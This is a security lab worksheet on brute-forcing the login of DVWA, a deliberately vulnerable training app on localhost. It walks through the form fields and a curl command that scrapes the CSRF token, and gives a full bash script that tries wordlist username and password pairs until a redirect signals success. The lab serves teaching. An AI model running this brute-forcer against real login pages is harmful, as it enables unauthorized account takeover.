# LAB SEC-WEB: DVWA - Brute-Force LOGIN


> dvwa: a web-application with user-login


## 1. learning objective: 

> Simulate Login Form with a bash script and curl command to get login access (user and password)


## the login-page: see and study

* view-source:http://localhost/login.php

~~~
<form action="login.php" method="post">
	<fieldset>
			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
			<br />
			<p class="submit"><input type="submit" value="Login" name="Login"></p>
	</fieldset>
	<input type='hidden' name='user_token' value='19ddb03bef544c60a0ba98457d9e5be8' />

	</form>
~~~

please note:
* method="post"
* name=username
* name=password
* user_token=19ddb03bef544c60a0ba98457d9e5be8

## every reload of login.php generates a new user_token
* with `curl -s -c dvwa.cookie "localhost/login.php" | grep  -P '[0-9a-f]{32}' | cut -d "'" -f6` you can get this user_token

## make an invalid login and note the answer (http-header or http-body)
* **Login failed**

## make a valid login and note the answer (http-header or http-body)
* **Location: index.php**


## test this bash-script (maybe adapt some variables)
* $? holds the return-value of the previous command
* curl -b

~~~
#!/bin/bash
# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
# Target: DVWA v1.10
#   Date: 2015-10-19
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/login/

# view changes by ahofa, 2018

## Variables
URL="http://localhost"
### USER_LIST="/usr/share/seclists/Usernames/top_shortlist.txt"
### PASS_LIST="/usr/share/seclists/Passwords/rockyou.txt"
USER_LIST="/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
PASS_LIST="/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | grep  -P '[0-9a-fA-F]{32}' | cut -d "'" -f6 )"
### -c store cookies
### -s silten
### -P [0-9a-fA-F]{32}    regex Perl : 32 hex digits
### cut 6. field (contains the 32 hex digits

[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    ## Connect to server
    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] Found!"
      echo "[i] Username: ${_USER}"
      echo "[i] Password: ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f /tmp/dvwa.cookie
~~~

